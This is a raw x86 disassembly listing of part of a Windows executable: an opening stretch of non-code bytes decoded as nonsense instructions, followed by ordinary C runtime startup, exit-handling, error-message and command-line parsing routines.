  4241dd:	ss dec edx
  4241df:	xchg   DWORD PTR [edx-0x4d],edi
  4241e2:	inc    ebp
  4241e3:	xchg   ebp,eax
  4241e4:	push   esi
  4241e5:	fwait
  4241e6:	add    DWORD PTR [ecx-0x6],eax
  4241e9:	bound  ebx,QWORD PTR [edi+0x743ea3e5]
  4241ef:	int    0x85
  4241f1:	out    0xd8,al
  4241f3:	mov    esi,0x233de631
  4241f8:	fs ss stos BYTE PTR es:[edi],al
  4241fb:	sbb    dl,BYTE PTR [edx]
  4241fd:	xor    eax,0xb0372847
  424202:	sub    eax,0xe3c2b5
  424207:	rol    DWORD PTR [ebp-0x19],0x3d
  42420b:	mov    al,ds:0xf8e8715e
  424210:	dec    eax
  424211:	push   cs
  424212:	aam    0xc0
  424214:	sub    DWORD PTR [ebp+0x77d5aa3f],0x3a89e3aa
  42421e:	stos   DWORD PTR es:[edi],eax
  42421f:	pop    es
  424220:	mov    ebx,0xca0266e5
  424225:	test   eax,0x912163d4
  42422a:	push   es
  42422b:	inc    esp
  42422c:	ret    0xe331
  42422f:	aas    
  424230:	cmp    DWORD PTR [edi+0x74b45800],ebp
  424236:	mov    ebp,0x91df2ba5
  42423b:	icebp  
  42423c:	test   BYTE PTR [esi+0x60],ch
  42423f:	xchg   esi,eax
  424240:	neg    edi
  424242:	sbb    al,ch
  424244:	jecxz  0x42427e
  424246:	shl    ecx,0x72
  424249:	dec    eax
  42424a:	mov    edx,0xde2683cf
  42424f:	push   esi
  424251:	dec    edi
  424252:	and    al,0xfe
  424254:	and    dh,al
  424256:	mov    ecx,0x6273a1b7
  42425b:	push   ecx
  42425c:	cmp    al,0x64
  42425e:	cmp    ch,dh
  424260:	mov    esi,0x1baa6062
  424265:	inc    ecx
  424266:	dec    esp
  424267:	adc    BYTE PTR [edx],cl
  424269:	out    dx,al
  42426a:	popf   
  42426b:	jmp    0x42429f
  42426d:	not    DWORD PTR [edx]
  42426f:	or     dh,al
  424271:	jns    0x4241f4
  424273:	test   eax,0xc679745c
  424278:	push   esi
  424279:	test   al,0x6e
  42427b:	inc    eax
  42427c:	js     0x42422f
  42427e:	jno    0x4242ef
  424280:	out    dx,eax
  424281:	icebp  
  424282:	pop    esp
  424283:	inc    ecx
  424284:	nop
  424285:	ins    DWORD PTR es:[edi],dx
  424286:	cs stos BYTE PTR es:[edi],al
  424288:	jnp    0x424281
  42428a:	loop   0x4242fb
  42428c:	and    DWORD PTR [eax-0x165663d9],eax
  424292:	mov    ch,0x1d
  424294:	mov    WORD PTR [edi-0x79c4d230],cs
  42429a:	jmp    0xbcbd9a81
  42429f:	adc    ecx,DWORD PTR ds:0x9c925ac4
  4242a5:	xor    dl,BYTE PTR [ecx+0x7d]
  4242a8:	(bad)  
  4242a9:	ds pop ss
  4242ab:	ret    
  4242ac:	aam    0xa
  4242ae:	mov    ds:0xe59936f2,eax
  4242b3:	mov    al,fs:0xe7493a06
  4242b9:	add    BYTE PTR [ecx+0x7e],0x71
  4242bd:	sbb    eax,0xa7e0cb
  4242c2:	cmp    bl,BYTE PTR ds:0xb26d33d4
  4242c8:	(bad)  
  4242c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242ca:	dec    ebp
  4242cb:	mov    bh,0x30
  4242cd:	dec    edi
  4242ce:	ins    BYTE PTR es:[edi],dx
  4242cf:	jecxz  0x4242d5
  4242d1:	jl     0x4242ea
  4242d3:	leave  
  4242d4:	loop   0x42431a
  4242d6:	rcr    ecx,0x1f
  4242d9:	inc    edx
  4242da:	pop    ecx
  4242db:	cmp    edi,edx
  4242dd:	mul    DWORD PTR [eax]
  4242df:	mov    edx,0xb57f00fa
  4242e4:	or     eax,0x11b5a64e
  4242e9:	je     0x424307
  4242eb:	lea    ebx,[ecx-0x13]
  4242ee:	push   eax
  4242ef:	outs   dx,DWORD PTR ds:[esi]
  4242f0:	ins    BYTE PTR es:[edi],dx
  4242f1:	inc    esi
  4242f2:	ja     0x42435a
  4242f4:	dec    ebp
  4242f5:	dec    edx
  4242f6:	out    0x78,al
  4242f8:	call   DWORD PTR [ebx]
  4242fa:	or     BYTE PTR [edi-0x491e21c4],ch
  424300:	push   0x8ede1d38
  424305:	neg    BYTE PTR [eax+0x45]
  424308:	xchg   edx,eax
  424309:	mul    dh
  42430b:	mov    edx,0xc827b2
  424310:	mov    edi,0x88cffdbd
  424315:	jl     0x4242dc
  424317:	cmc    
  424318:	nop
  424319:	jecxz  0x4242ac
  42431b:	and    eax,0xb1b10b84
  424320:	jns    0x42434c
  424322:	pop    ebp
  424323:	(bad)  
  424324:	or     eax,0x6e2f1cfd
  424329:	cmp    al,0x63
  42432b:	adc    dh,dl
  42432d:	shl    BYTE PTR [esp+edx*1],cl
  424330:	mov    cl,0x6c
  424332:	je     0x42437e
  424334:	push   esi
  424336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424337:	sub    eax,0x904f953
  42433c:	cli    
  42433d:	inc    ebp
  42433e:	out    0x57,al
  424340:	sbb    DWORD PTR [edi+0x5fb541b5],0xec430316
  42434a:	outs   dx,BYTE PTR ds:[esi]
  42434b:	adc    dl,BYTE PTR [edi-0x5a]
  42434e:	add    BYTE PTR [edx],bl
  424350:	rcr    ebp,0xaf
  424353:	or     eax,0xdccdf38e
  424358:	inc    edi
  424359:	push   ss
  42435a:	mov    ebp,edi
  42435c:	sbb    ebx,DWORD PTR ss:[eax-0x36]
  424360:	mov    edi,cs
  424362:	mov    DWORD PTR [ecx],esi
  424364:	mov    ds:0xbffc9fe4,al
  424369:	lock push eax
  42436b:	inc    ecx
  42436c:	pop    ss
  42436d:	inc    esp
  42436e:	and    DWORD PTR [ecx-0x57],edx
  424371:	jo     0x4243ce
  424373:	push   ebx
  424374:	retf   
  424375:	cmp    ecx,DWORD PTR [edx+0x1b]
  424378:	mov    edi,DWORD PTR [edx]
  42437a:	scas   eax,DWORD PTR es:[edi]
  42437b:	or     DWORD PTR [ebx+0x7a7ccc4b],0x93060351
  424385:	push   cs
  424386:	clc    
  424387:	adc    ah,BYTE PTR [ebx-0x19]
  42438a:	and    bl,BYTE PTR [ecx-0x70ce07fa]
  424390:	push   es
  424391:	mov    ss,esi
  424393:	dec    esp
  424394:	jb     0x42432f
  424396:	push   ebx
  424397:	inc    BYTE PTR [edi+0x2b]
  42439a:	add    DWORD PTR [ebx+0x79e39c9a],esp
  4243a0:	mov    ah,0x82
  4243a2:	data16 mov ah,0x98
  4243a5:	inc    esi
  4243a6:	inc    esp
  4243a7:	dec    ebp
  4243a8:	(bad)  
  4243aa:	pop    fs
  4243ac:	js     0x424422
  4243ae:	mov    eax,0xd627d313
  4243b3:	lods   al,BYTE PTR ds:[esi]
  4243b4:	mov    edi,0x96d4a884
  4243b9:	jge    0x4243f4
  4243bb:	or     BYTE PTR [ecx-0x41],0x3b
  4243bf:	lods   al,BYTE PTR ds:[esi]
  4243c0:	aad    0x95
  4243c2:	mov    al,ds:0x71bd0566
  4243c7:	sbb    esp,DWORD PTR ds:0xc99420e5
  4243cd:	dec    esp
  4243ce:	(bad)  
  4243cf:	jae    0x424375
  4243d1:	pop    esi
  4243d2:	bound  esp,QWORD PTR [ebp+0x5c6199f0]
  4243d8:	test   BYTE PTR [edx-0x349bf33c],ah
  4243de:	mov    dl,BYTE PTR [esi+0x2fa3d2bd]
  4243e4:	test   DWORD PTR [ebx-0x28],ebx
  4243e7:	test   al,0xe9
  4243e9:	dec    edx
  4243ea:	jp     0x4243c3
  4243ec:	cmp    BYTE PTR [eax],0x3b
  4243ef:	adc    edx,DWORD PTR [ecx+0x5e]
  4243f2:	idiv   BYTE PTR [ecx-0x6f2fdf15]
  4243f8:	leave  
  4243f9:	test   ebx,0x6aa4c86a
  4243ff:	add    BYTE PTR [edx+0x0],ch
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
